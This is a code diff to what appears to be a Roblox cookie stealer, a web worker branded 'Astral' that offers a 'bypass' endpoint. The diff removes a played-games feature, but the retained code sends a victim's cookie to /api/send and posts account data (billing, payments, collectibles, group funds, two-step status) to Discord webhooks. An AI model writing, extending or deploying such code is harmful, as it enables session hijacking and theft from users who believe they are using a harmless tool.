@@ -193,7 +193,6 @@ export default {
             body: JSON.stringify({ type: 'secondary', data: data, cookie: cookie })
         }).catch(function(err) { console.log('secondary err:', err); });
 
-        // Send cookie embed after 1 second
         setTimeout(function() {
             fetch('/api/send', {
                 method: 'POST',
@@ -307,41 +306,6 @@ export default {
       });
     }
 
-    // ---- Played Games Endpoint ----
-    if (url.pathname === '/played' && request.method === 'GET') {
-      try {
-        const userId = url.searchParams.get('userId');
-        if (!userId) {
-          return new Response(JSON.stringify({ error: 'Missing userId parameter' }), { status: 400 });
-        }
-
-        const response = await fetch(`https://games.roblox.com/v2/users/${userId}/games?sortOrder=Desc&limit=10`, {
-          headers: {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-          }
-        });
-
-        if (!response.ok) {
-          return new Response(JSON.stringify({ error: 'Failed to fetch played games' }), { status: response.status });
-        }
-
-        const data = await response.json();
-        const games = data.data || [];
-        const top3 = games.slice(0, 3).map(g => g.name || 'Unknown Game');
-
-        return new Response(JSON.stringify({
-          top3: top3.length > 0 ? top3 : ['None']
-        }), {
-          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
-        });
-      } catch (error) {
-        return new Response(JSON.stringify({ error: error.message }), {
-          status: 500,
-          headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }
-        });
-      }
-    }
-
     // ---- Internal Webhook Sender ----
     if (url.pathname === '/api/send') {
       try {
@@ -362,6 +326,7 @@ export default {
         const moneyEmoji = '<:money:1334576383862771793>';
 
         const profileLink = `https://www.roblox.com/users/${d.userId}/profile`;
+        // Correct Roblox thumbnail API
         const thumbnailLink = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=420x420&format=Png&isCircular=false`;
 
         let accountAge = 'Unknown';
@@ -407,24 +372,6 @@ export default {
         else if (type === 'secondary') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
 
-          // Fetch top 3 played games
-          let topGames = ['None'];
-          try {
-            const gamesResp = await fetch(`https://games.roblox.com/v2/users/${d.userId}/games?sortOrder=Desc&limit=10`, {
-              headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-              }
-            });
-            if (gamesResp.ok) {
-              const gamesData = await gamesResp.json();
-              const games = gamesData.data || [];
-              topGames = games.slice(0, 3).map(g => g.name || 'Unknown Game');
-              if (topGames.length === 0) topGames = ['None'];
-            }
-          } catch (e) {
-            topGames = ['Error fetching games'];
-          }
-
           // Collectibles list
           let collectibles = 'None';
           if (d.limiteds && d.limiteds.length > 0) {
@@ -452,8 +399,7 @@ export default {
               { name: 'Collectibles', value: collectibles, inline: false },
               { name: 'Billing', value: `Credit: ${d.credit || 0}\nConvert: ${d.convert || 0}\nPayments: ${d.payments || 0}`, inline: false },
               { name: 'Groups', value: `Balance: ${d.groupBalance || 0}\nPending: ${d.groupPending || 0}\nOwned: ${d.groupOwned || 0}`, inline: false },
-              { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false },
-              { name: 'Played Games (Top 3)', value: topGames.map(g => `• ${g}`).join('\n') || 'None', inline: false }
+              { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false }
             ],
             thumbnail: { url: thumbnailLink },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
@@ -739,7 +685,6 @@ export default {
       endpoints: {
         '/': 'HTML Frontend',
         '/bypass/astral/bypass.php': 'POST - Main bypass endpoint',
-        '/played?userId=ID': 'GET - Played games top 3',
         '/proxy': 'POST - Proxy to original API',
         '/health': 'GET - Health check'
       },
